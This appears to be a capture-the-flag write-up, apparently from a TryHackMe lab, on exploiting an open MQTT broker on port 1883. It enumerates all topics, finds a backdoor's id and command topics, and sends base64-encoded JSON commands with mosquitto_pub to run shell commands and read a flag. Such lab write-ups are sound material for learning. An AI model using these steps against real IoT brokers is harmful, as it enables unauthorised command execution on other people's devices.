# MQTT port 1883

## To Know the Port 1883 details
```
rustscan -a $IP -p 1883 -- -sC -sV

PORT     STATE SERVICE                  REASON  VERSION
1883/tcp open  mosquitto version 2.0.14 syn-ack
| mqtt-subscribe: 
|   Topics and their most recent payloads: 
|     $SYS/broker/uptime: 2310 seconds
|     $SYS/broker/store/messages/bytes: 214
|     $SYS/broker/load/sockets/5min: 0.90
|     $SYS/broker/publish/bytes/received: 117609
|     $SYS/broker/load/sockets/15min: 0.33
|     storage/thermostat: {"id":9274994746874572961,"temperature":23.918259}
|     $SYS/broker/messages/sent: 3472
|     $SYS/broker/load/messages/sent/1min: 92.34
|     $SYS/broker/clients/connected: 2
|     $SYS/broker/clients/inactive: -1
|     $SYS/broker/load/messages/sent/15min: 83.34
|     $SYS/broker/bytes/received: 164685
|     $SYS/broker/load/messages/received/15min: 83.34
|     kitchen/toaster: {"id":2999455700520209666,"in_use":true,"temperature":152.91774,"toast_time":237}
|_    $SYS/broker/load/bytes/sent/1min: 369.35
```
Above scanning it works on Temperature IOT device 

## MQTT port works between IOT devices and control device

<img width="974" height="788" alt="image" src="https://github.com/user-attachments/assets/97732c55-350f-485e-ae58-cbd12a602f3e" />

## By using mosquitto_sub tool which topics are sent by publisher

```
# mosquitto_sub -t "#" -h 10.201.26.34
```

## We will see id, command , publisher's topic and subscriber topic

```
{"id":"cdd1b1c0-1c40-4b0f-8e22-61b357548b7d","registered_commands":["HELP","CMD","SYS"],"pub_topic":"U4vyqNlQtf/0vozmaZyLT/15H9TF6CHg/pub","sub_topic":"XD2rfR9Bez/GqMpRSEobh/TvLQehMg0E/sub"}

cdd1b1c0-1c40-4b0f-8e22-61b357548b7d = backdoor id
```

## Subscriber listen which message is sent by publisher by using publisher's id

```
# mosquitto_sub -t "U4vyqNlQtf/0vozmaZyLT/15H9TF6CHg/pub" -h 10.201.26.34
```

## Publisher send message to subscriber by using subscriber's id

```
# mosquitto_pub -t "XD2rfR9Bez/GqMpRSEobh/TvLQehMg0E/sub" -m "text message" -h 10.201.26.34
```

## Message after decoded by base64

```
Invalid message format.
Format: base64({"id": "<backdoor id>", "cmd": "<command>", "arg": "<argument>"})
```

## Using that format to type command

```
base64({"id": "cdd1b1c0-1c40-4b0f-8e22-61b357548b7d", "cmd": "CMD", "arg": "ls -al"})
```

## Turn Base64 and send it to subscriber

<img width="955" height="569" alt="image" src="https://github.com/user-attachments/assets/cd1e987a-4c3f-4569-8bd7-7c9812e693c4" />

```
mosquitto_pub -t "XD2rfR9Bez/GqMpRSEobh/TvLQehMg0E/sub" -m "eyJpZCI6ICJjZGQxYjFjMC0xYzQwLTRiMGYtOGUyMi02MWIzNTc1NDhiN2QiLCAiY21kIjogIkNNRCIsICJhcmciOiAibHMifQ==" -h 10.201.26.34
```

## After decode base64 from subscriber

<img width="956" height="589" alt="image" src="https://github.com/user-attachments/assets/dfdab362-a110-4473-b5f2-a631444ac269" />

## Cat the flag.txt and we will get THM flag

<img width="949" height="646" alt="image" src="https://github.com/user-attachments/assets/012767f0-c08b-4093-9e58-793b283aaf63" />



